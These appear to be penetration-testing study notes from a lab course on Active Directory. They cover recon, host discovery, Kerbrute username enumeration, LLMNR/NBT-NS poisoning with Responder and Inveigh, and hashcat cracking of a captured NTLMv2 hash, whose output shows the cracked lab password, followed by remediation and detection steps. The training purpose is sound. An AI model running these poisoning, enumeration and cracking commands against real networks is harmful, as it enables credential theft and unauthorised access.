# External Recon and Enumeration Principles
What Are We Looking For?
Data Point | 	            Description
-- | --
IP Space	   |              Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.
Domain Information	    | Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)
Schema Format	          |   Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc. (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.) Breach Data	Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.
Our list of data points above can be gathered in many different ways. There are many different websites and tools that can provide us with some or all of the information above that we could use to obtain information vital to our assessment. The table below lists a few potential resources and examples that can be used.
Resource | 	Examples
-- | --
ASN / IP registrars | 	            [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)
Domain Registrars & DNS	        | [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8.
Social Media	                    | Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.
Public-Facing Company Websites	| Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us"  and "Contact Us" pages can also be gold mines.
Cloud & Dev Storage Spaces | 	    GitHub, AWS S3 buckets & Azure Blog [storage containers](https://grayhatwarfare.com/), Google searches using "[Dorks](https://www.exploit-db.com/google-hacking-database)
Breach Data Sources | 	            HaveIBeenPwned to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals  (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.
## Finding address spaces 
The BGP-Toolkit hosted by [Hurricane Electric](http://he.net/) is a fantastic resource for researching what address blocks are assigned to an organization and what ASN they reside within. Just punch in a domain or IP address, and the toolkit will search for any results it can. We can glean a lot from this info. Many large corporations will often self-host their infrastructure, and since they have such a large footprint, they will have their own ASN. This will typically not be the case for smaller organizations or fledgling companies. As you research, keep this in mind since smaller organizations will often host their websites and other infrastructure in someone else's space (Cloudflare, Google Cloud, AWS, or Azure, for example). Understanding where that infrastructure resides is extremely important for our testing. We have to ensure we are not interacting with infrastructure out of our scope. If we are not careful while pentesting against a smaller organization, we could end up inadvertently causing harm to another organization sharing that infrastructure. You have an agreement to test with the customer, not with others on the same server or with the provider. Questions around self-hosted or 3rd party managed infrastructure should be handled during the scoping process and be clearly listed in any scoping documents you receive.

In some cases, your client may need to get written approval from a third-party hosting provider before you can test. Others, such as [AWS](https://aws.amazon.com/security/penetration-testing/), have specific guidelines for performing penetration tests and do not require prior approval for testing some of their services. Others, such as Oracle, ask you to submit a [Cloud Security Testing Notification](https://docs.oracle.com/en-us/iaas/Content/Security/Concepts/security_testing-policy_notification.htm). These types of steps should be handled by your company management, legal team, contracts team, etc. If you are in doubt, escalate before attacking any external-facing services you are unsure of during an assessment. It is our responsibility to ensure that we have explicit permission to attack any hosts (both internal and external), and stopping and clarifying the scope in writing never hurts.
## DNS
DNS is a great way to validate our scope and find out about reachable hosts the customer did not disclose in their scoping document. Sites like [domaintools](https://whois.domaintools.com/), and [viewdns.info](https://viewdns.info/) are great spots to start. We can get back many records and other data ranging from DNS resolution to testing for DNSSEC and if the site is accessible in more restricted countries. Sometimes we may find additional hosts out of scope, but look interesting. In that case, we could bring this list to our client to see if any of them should indeed be included in the scope. We may also find interesting subdomains that were not listed in the scoping documents, but reside on in-scope IP addresses and therefore are fair game.

This is also a great way to validate some of the data found from our IP/ASN searches. Not all information about the domain found will be current, and running checks that can validate what we see is always good practice.

## Public Data
Social media can be a treasure trove of interesting data that can clue us in to how the organization is structured, what kind of equipment they operate, potential software and security implementations, their schema, and more. On top of that list are job-related sites like LinkedIn, Indeed.com, and Glassdoor. Simple job postings often reveal a lot about a company. _Don't discount public information such as job postings or social media_. You can learn a lot about an organization just from what they post, and a well-intentioned post could disclose data relative to us as penetration testers.

Websites hosted by the organization are also great places to dig for information. We can gather contact emails, phone numbers, organizational charts, published documents, etc. These sites, specifically the embedded documents, can often have links to internal infrastructure or intranet sites that you would not otherwise know about. Checking any publicly accessible information for those types of details can be quick wins when trying to formulate a picture of the domain structure. With the growing use of sites such as GitHub, AWS cloud storage, and other web-hosted platforms, data can also be leaked unintentionally. For example, a dev working on a project may accidentally leave some credentials or notes hardcoded into a code release. If you know where to look for that data, it can give you an easy win. It could mean the difference between having to password spray and brute-force credentials for hours or days or gaining a quick foothold with developer credentials, which may also have elevated permissions. Tools like [Trufflehog](https://github.com/trufflesecurity/truffleHog) and sites like [Greyhat Warfare](https://buckets.grayhatwarfare.com/) are fantastic resources for finding these breadcrumbs.

## Initial enumeration of the domain
For this first portion of the test, we are starting on an attack host placed inside the network for us. This is one common way that a client might select for us to perform an internal penetration test. A list of the types of setups a client may choose for testing includes:
+ A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN, and we can SSH into.
+ A physical device plugged into an ethernet port that calls back to us over VPN, and we can SSH into.
+ A physical presence at their office with our laptop plugged into an ethernet port.
+ A Linux VM in either Azure or AWS with access to the internal network that we can SSH into using public key authentication and our public IP address whitelisted.
+ VPN access into their internal network (a bit limiting because we will not be able to perform certain attacks such as LLMNR/NBT-NS Poisoning).
+ From a corporate laptop connected to the client's VPN.
+ On a managed workstation (typically Windows), physically sitting in their office with limited or no internet access or ability to pull in tools. They may also elect this option but give you full internet access, local admin, and put endpoint protection into monitor mode so you can pull in tools at will.
+ On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the managed workstation typically accessible over VPN either remotely or from a corporate laptop.

These are the most common setups I have seen, though a client may come up with another variation of one of these. The client may also choose from a "grey box" approach where they give us just a list of in-scope IP addresses/CIDR network ranges, or "black box" where we have to plug in and do all discovery blindly using various techniques. Finally, they can choose either evasive, non-evasive, or hybrid evasive (starting "quiet" and slowly getting louder to see what threshold we are detected at and then switching to non-evasive testing. They may also elect to have us start with no credentials or from the perspective of a standard domain user.
Our customer Inlanefreight has chosen the following approach because they are looking for as comprehensive an assessment as possible. At this time, their security program is not mature enough to benefit from any form of evasive testing or a "black box" approach.
+ A custom pentest VM within their internal network that calls back to our jump host, and we can SSH into it to perform testing.
+ They've also given us a Windows host that we can load tools onto if need be.
+ They've asked us to start from an unauthenticated standpoint but have also given us a standard domain user account (htb-student) which can be used to access the Windows attack host.
+ "Grey box" testing. They have given us the network range 172.16.5.0/23 and no other information about the network.
+ Non-evasive testing.
- We have not been provided credentials or a detailed internal network map.

## Tasks
Our tasks to accomplish for this section are:
+ Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.
+ This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.
+ Document any findings we come across for later use. Extremely important!

We will start from our Linux attack host without domain user credentials. It's a common thing to start a pentest off in this manner. Many organizations will wish to see what you can do from a blind perspective, such as this, before providing you with further information for the test. It gives a more realistic look at what potential avenues an adversary would have to use to infiltrate the domain. It can help them see what an attacker could do if they gain unauthorized access via the internet (i.e., a phishing attack), physical access to the building, wireless access from outside (if the wireless network touches the AD environment), or even a rogue employee. Depending on the success of this phase, the customer may provide us with access to a domain-joined host or a set of credentials for the network to expedite testing and allow us to cover as much ground as possible.

Below are some of the _key data points_ that we should be looking for at this time and noting down into our notetaking tool of choice and saving scan/tool output to files whenever possible.
   Data Point	               |      Description
	--| --
   AD Users	               |      We are trying to enumerate valid user accounts we can target for password spraying.
   AD Joined                  |      Computers	Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.
   Key Services	           |      Kerberos, NetBIOS, LDAP, DNS

# Identifying Hosts
First, let's take some time to listen to the network and see what's going on. We can use Wireshark and TCPDump to "put our ear to the wire" and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is "black box." We notice some ARP requests and replies, MDNS, and other basic layer two packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer's network setup.
## Capture traffic
If we are on a host without a GUI (which is typical), we can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](http://www.netminer.com/main/main-read.doc) etc., to perform the same functions. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.
```bash
m1l0js@htb[/htb]$ sudo tcpdump -i ens224 
```
There is no one right way to listen and capture network traffic. There are plenty of tools that can process network data. Wireshark and tcpdump are just a few of the easiest to use and most widely known. Depending on the host you are on, you may already have a network monitoring tool built-in, such as `pktmon.exe`, which was added to all editions of Windows 10. As a note for testing, it's always a good idea to save the PCAP traffic you capture. You can review it again later to look for more hints, and it makes for great additional information to include while writing your reports.
Our first look at network traffic pointed us to a couple of hosts via MDNS and ARP. Now let's utilize a tool called Responder to analyze network traffic and determine if anything else in the domain pops up.
## Responder
[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.
```bash
sudo responder -I ens224 -A 
```
As we start Responder with passive analysis mode enabled, we will see requests flow in our session. Notice below that we found a few unique hosts not previously mentioned in our Wireshark captures. It's worth noting these down as we are starting to build a nice target list of IPs and DNS hostnames.
Our passive checks have given us a few hosts to note down for a more in-depth enumeration. 
## ICMP sweep 
Now let's perform some active checks starting with a quick ICMP sweep of the subnet using fping. Fping provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. Let's see it in action. Here we'll start fping with a few flags: a to show targets that are alive, s to print stats at the end of the scan, g to generate a target list from the CIDR network, and q to not show per-target results.
```bash
m1l0js@htb[/htb]$ fping -asgq 172.16.5.0/23
172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240
```
Option | Description 
-- | -- 
`a` | Show targets that are alive
`s` | Print stats at the end of the scan
`g` | Generate a target list from the CIDR network
`q` | Not show per-target results
## Nmap Scanning
Now that we have a list of active hosts within our network, we can enumerate those hosts further. We are looking to determine what services each host is running, identify critical hosts such as Domain Controllers and web servers, and identify potentially vulnerable hosts to probe later. With our focus on AD, after doing a broad sweep, it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few. Below is a quick example of a simple Nmap scan.
```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```
The `-A` (Aggressive scan options) scan will perform several functions. One of the most important is a quick enumeration of well-known ports to include web services, domain services, etc. For our hosts.txt file, some of our results from Responder and fping overlapped (we found the name and IP address), so to keep it simple, just the IP address was fed into hosts.txt for the scan.
# Identifying users
If our client does not provide us with a user to start testing with (which is often the case), we will need to find a way to establish a foothold in the domain by either obtaining clear text credentials or an NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or a shell in the context of a domain user account. Obtaining a valid user with credentials is critical in the early stages of an internal penetration test. This access (even at the lowest level) opens up many opportunities to perform enumeration and even attacks. Let's look at one way we can start gathering a list of valid users in a domain to use later in our assessment.
## Kerbrute - Internal AD Username Enumeration
Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.
### Kerbrute installation
To get started with Kerbrute, we can download precompiled binaries for the tool for testing from Linux, Windows, and Mac, or we can compile it ourselves. This is generally the best practice for any tool we introduce into a client environment. To compile the binaries to use on the system of our choosing, we first clone the repo:	
```bash
m1l0js@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git
```
#### Listing Compiling Options
Typing make help will show us the compiling options available.
```bash
m1l0js@htb[/htb]$ make help

help:            Show this help.
windows:  Make Windows x86 and x64 Binaries
linux:  Make Linux x86 and x64 Binaries
mac:  Make Darwin (Mac) x86 and x64 Binaries
clean:  Delete any binaries
all:  Make Windows, Linux and Mac x86/x64 Binaries
```
We can choose to compile just one binary or type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
#### Compiling for Multiple Platforms and Architectures
```bash
m1l0js@htb[/htb]$ sudo make all
```
#### Listing the Compiled Binaries in dist
The newly created dist directory will contain our compiled binaries.
```bash
m1l0js@htb[/htb]$ ls dist/
kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe
```
#### Testing the kerbrute_linux_amd64 Binary
We can then test out the binary to make sure it works properly. We will be using the x64 version on the supplied Parrot Linux attack host in the target environment.
```bash
m1l0js@htb[/htb]$ ./kerbrute_linux_amd64 
```
#### Adding the Tool to our Path
We can add the tool to our PATH to make it easily accessible from anywhere on the host.
```bash
m1l0js@htb[/htb]$ echo $PATH
/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
```
#### Moving the Binary
```bash
m1l0js@htb[/htb]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```
We can now type kerbrute from any location on the system and will be able to access the tool. Feel free to follow along on your system and practice the above steps. Now let's run through an example of using the tool to gather an initial username list.
### Enumerating Users with Kerbrute
```bash
m1l0js@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
We can see from our output that we validated 56 users in the INLANEFREIGHT.LOCAL domain and it took only a few seconds to do so. Now we can take these results and build a list for use in targeted password spraying attacks.
# Identifying Potential Vulnerabilities
The local system account `NT AUTHORITY\SYSTEM` is a built-in account in Windows operating systems. It has the highest level of access in the OS and is used to run most Windows services. It is also very common for third-party services to run in the context of this account by default. A SYSTEM account on a domain-joined host will be able to enumerate Active Directory by impersonating the computer account, which is essentially just another kind of user account. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account.

There are several ways to gain SYSTEM-level access on a host, including but not limited to:
+ Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
+ Abusing a service running in the context of the SYSTEM account, or abusing the service account SeImpersonate privileges using Juicy Potato. This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
+ Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
+ Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window

> By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:
+ Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
+ Perform Kerberoasting / ASREPRoasting attacks within the same domain.
+ Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
+ Perform token impersonation to hijack a privileged domain user account.
+ Carry out ACL attacks.

# LLMNR/NBT-NS Poisoning 
At this point, we have completed our initial enumeration of the domain. We obtained some basic user and group information, enumerated hosts while looking for critical services and roles like a Domain Controller, and figured out some specifics such as the naming scheme used for the domain. In this phase, we will work through two different techniques side-by-side: _network poisoning and password spraying_. We will perform these actions with the goal of acquiring valid cleartext credentials for a domain user account, thereby granting us a foothold in the domain to begin the next phase of enumeration from a credentialed standpoint.

This section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: _a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts_. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!
## LLMNR & NBT-NS Primer
Link-Local Multicast Name Resolution ([LLMNR](https://datatracker.ietf.org/doc/html/rfc4795)) and NetBIOS Name Service ([NBT-NS](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN)) are Microsoft Windows components that serve as alternate methods of host identification that can be used _when DNS fails_. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.  If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. 
Service | Port
-- | -- 
LLMNR | 5355 UDP natively
NBT-NS | 137 UDP 
_The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply_. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. _If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash_ and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.
### Quick Example - LLMNR/NBT-NS Poisoning
Let's walk through a quick example of the attack flow at a very high level:
+ A host attempts to connect to the print server at `\\print01.inlanefreight.local`, but accidentally types in `\\printer01.inlanefreight.local`.
+ The DNS server responds, stating that this host is unknown.
+ The host then broadcasts out to the entire local network asking if anyone knows the location of `\\printer01.inlanefreight.local`.
+ The attacker (us with Responder running) responds to the host stating that it is the `\\printer01.inlanefreight.local` that the host is looking for.
+ The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
+ This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.
		
We are performing these actions to collect authentication information sent over the network in the form of NTLMv1 and NTLMv2 password hashes. As discussed in the Introduction to Active Directory module, NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. We will then take the hash and attempt to crack them offline using tools such as Hashcat or John with the goal of obtaining the account's cleartext password to be used to gain an initial foothold or expand our access within the domain if we capture a password hash for an account with more privileges than an account that we currently possess.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:
Tool  | 	Description
-- | --
[Responder](https://github.com/lgandx/Responder) 	| Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.
[Inveigh](https://github.com/Kevin-Robertson/Inveigh) 	| Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.
[Metasploit](https://www.metasploit.com/) 	| Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.
		
This section and the following one will show examples of using Responder and Inveigh to capture password hashes and attempt to crack them offline. We commonly start an internal penetration test from an anonymous position on the client's internal network with a Linux attack host. Tools such as Responder are great for establishing a foothold that we can later expand upon through further enumeration and attacks. Responder is written in Python and typically used on a Linux attack host, though there is a .exe version that works on Windows. Inveigh is written in both C# and PowerShell (considered legacy). Both tools can be used to attack the following protocols:
```txt
LLMNR
DNS
MDNS
NBNS
DHCP
ICMP
HTTP
HTTPS
SMB
LDAP
WebDAV
Proxy Auth
```
Responder also has support for:
```bash
MSSQL
DCE-RPC
FTP, POP3, IMAP, and SMTP auth
```
## From Linux
### Responder In Action
Responder is a relatively straightforward tool, but is extremely powerful and has many different functions. In the Initial Enumeration section earlier, we utilized Responder in Analysis (passive) mode. This means it listened for any resolution requests, but did not answer them or send out poisoned packets. We were acting like a fly on the wall, just listening. Now, we will take things a step further and let Responder do what it does best. 

Common options | Description
-- | --
`-A` | Analyze mode. Without poisoning any responses
`-w` | Start the WPAD rogue proxy server 
`-f` | Attempt to fingerpint the remote host operating system and version
`-F ` | Force NTLM or Basic authentication 
`-P` | Force proxy authentication

As shown earlier in the module, the `-A` flag puts us into analyze mode, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses. We must always supply either an interface or an IP. Some common options we'll typically want to use are `-wf`; this will start the WPAD rogue proxy server, while `-f` will attempt to fingerprint the remote host operating system and version. We can use the `-v` flag for increased verbosity if we are running into issues, but this will lead to a lot of additional data printed to the console. Other options such as `-F` and `-P` can be used to force NTLM or Basic authentication and force proxy authentication, _but may cause a login prompt, so they should be used sparingly_. The use of the `-w` flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.

With this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory. Hashes are saved in the format (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt, and one hash is printed to the console and stored in its associated log file unless `-v` mode is enabled. For example, a log file may look like SMB-NTLMv2-SSP-172.16.5.25. Hashes are also stored in a SQLite database that can be configured in the Responder.conf config file, typically located in `/usr/share/responder` unless we clone the Responder repo directly from GitHub.

We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:
```txt
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```
Any of the rogue servers (i.e., SMB) can be disabled in the Responder.conf file.

### Responder Logs
```bash
m1l0js@htb[/htb]$ ls

Analyzer-Session.log                Responder-Session.log
Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt
Poisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt
```
If Responder successfully captured hashes, as seen above, we can find the hashes associated with each host/protocol in their own text file. 
We can kick off a Responder session rather quickly:
### Starting Responder with Default Settings
```bash
sudo responder -I ens224 
```
### Other config
```bash
sudo responder -I ens224 -wF -v
```
### Cracking an NTLMv2 Hash With Hashcat
Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using _hash mode 5600 for NTLMv2 hashes_ that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the Hashcat example hashes page to identify them and find the proper hash mode. 
Once we have enough, we need to get these hashes into a usable format for us right now. _NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pash-the-hash, meaning we have to attempt to crack them offline_. We can do this with tools such as Hashcat and John.
```bash
m1l0js@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
			FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
```
Looking at the results above, we can see we cracked the NET-NTLMv2 hash for user FOREND, whose password is Klmcargo2. Lucky for us our target domain allows weak 8-character passwords. This hash type can be "slow" to crack even on a GPU cracking rig, so large and complex passwords may be more difficult or impossible to crack within a reasonable amount of time.
## From Windows
LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool Inveigh and attempt to capture another set of credentials.
### Inveigh - Overview
If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth. 
### Using Inveigh(powershell version)
We can get started with the PowerShell version as follows and then list all possible parameters. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```
Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help). We can see that we immediately begin getting LLMNR and mDNS requests
```powershell
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
### C# Inveigh (InveighZero)
The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. 

Let's go ahead and run the C# version with the defaults and start capturing hashes.
```powershell
PS C:\htb> .\Inveigh.exe
```
As we can see, the tool starts and shows which options are enabled by default and which are not. The options with a `[+]` are default and enabled by default and the ones with a `[ ]` before them are disabled. The running console output also shows us which options are disabled and, therefore, responses are not being sent (mDNS in the above example). We can also see the message Press ESC to enter/exit interactive console, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.
We can hit the esc key to enter the console while Inveigh is running.
After typing `HELP` and hitting enter, we are presented with several options:
We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.

## Remediation
Mitre ATT&CK lists this technique as ID: T1557.001, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay.
There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can:
* _Disable LLMNR and NBT-NS_. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully. As penetration testers, we can recommend these remediation steps, but should clearly communicate to our clients that they should test these changes heavily to ensure that disabling both protocols does not break anything in the network.
* _We can disable LLMNR in Group Policy_ by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution." 
* _NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host_. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable [NetBIOS over TCP/IP](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png). While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
In the Local Group Policy Editor, we will need to double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
To push this out to all hosts in a domain, we could create a GPO using Group Policy Management on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
```powershell
\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.
* Other mitigations include _filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks_. Network intrusion detection and prevention systems can also be used to mitigate this activity, _while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly_.
## Detection
It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. 

Furthermore, hosts can be monitored for traffic on ports `UDP 5355` and `137`, and event IDs `4697` and `7045` can be monitored for. Finally, we can monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the EnableMulticast DWORD value. A value of `0` would mean that LLMNR is disabled.
## Moving On
